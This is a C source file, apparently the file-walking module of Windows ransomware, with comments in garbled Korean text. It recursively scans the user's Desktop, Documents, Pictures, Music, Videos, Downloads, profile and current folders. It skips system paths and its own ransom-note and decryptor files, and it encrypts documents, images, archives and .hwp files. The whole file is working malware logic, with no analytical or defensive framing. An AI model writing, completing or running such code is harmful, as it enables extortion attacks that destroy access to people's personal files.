// encryptor_walker.c
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <string.h>
#include <initguid.h>
#include <knownfolders.h>
#include "encryptor.h"
#include "walker.h"

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")

// ��ȣȭ ��� Ȯ���� ����Ʈ
const char* extList[] = {
    ".txt", ".docx", ".xlsx", ".pdf", ".jpg", ".png", ".hwp", ".zip", ".pptx"
};

// ��ȣȭ ��� �������� �Ǵ� (Ȯ���� ��)
int is_target_file(const char* filename) {
    const char* ext = strrchr(filename, '.');
    if (!ext) return 0;
    for (int i = 0; i < sizeof(extList) / sizeof(extList[0]); i++) {
        if (_stricmp(ext, extList[i]) == 0) return 1;
    }
    return 0;
}

// ��ȣȭ ���� ������� �Ǵ� (.adr, decrypt ���� ����)
int should_skip_file(const char* filename) {
    if (StrStrIA(filename, ".adr")) return 1;
    if (StrStrIA(filename, "decrypt") || StrStrIA(filename, "README")) return 1;
    return 0;
}

// �ý��� ��� ���� Ȯ��
int is_system_path(const char* path) {
    return (
        StrStrIA(path, "\\Windows\\") ||
        StrStrIA(path, "\\Program Files") ||
        StrStrIA(path, "\\AppData\\")
        );
}

// ������ ���丮 �� ����� ��ȣȭ ����
void scan_and_encrypt(const char* dir, const unsigned char* key, const unsigned char* iv) {
    if (is_system_path(dir)) return;

    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_and_encrypt(fullpath, key, iv);
        }
        else {
            if (should_skip_file(fd.cFileName)) {
                continue;
            }
            if (is_target_file(fd.cFileName)) {
                encrypt_file(fullpath, key, iv);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

// �ֿ� ����� ���� �� ���� ���� ��ȣȭ ����
void encrypt_all_targets(const unsigned char* key, const unsigned char* iv) {
    const int folders[] = {
        CSIDL_DESKTOP, CSIDL_PERSONAL, CSIDL_MYPICTURES,
        CSIDL_MYMUSIC, CSIDL_MYVIDEO, CSIDL_PROFILE
    };

    char path[MAX_PATH];
    for (int i = 0; i < sizeof(folders) / sizeof(folders[0]); i++) {
        if (SHGetFolderPathA(NULL, folders[i], NULL, 0, path) == S_OK) {
            scan_and_encrypt(path, key, iv);
        }
    }

    // Downloads ���� ��ȣȭ
    PWSTR wpath = NULL;
    if (SHGetKnownFolderPath(&FOLDERID_Downloads, 0, NULL, &wpath) == S_OK) {
        wcstombs(path, wpath, MAX_PATH);
        scan_and_encrypt(path, key, iv);
        CoTaskMemFree(wpath);
    }

    // ���� ���� ��ȣȭ
    GetCurrentDirectoryA(MAX_PATH, path);
    scan_and_encrypt(path, key, iv);
}
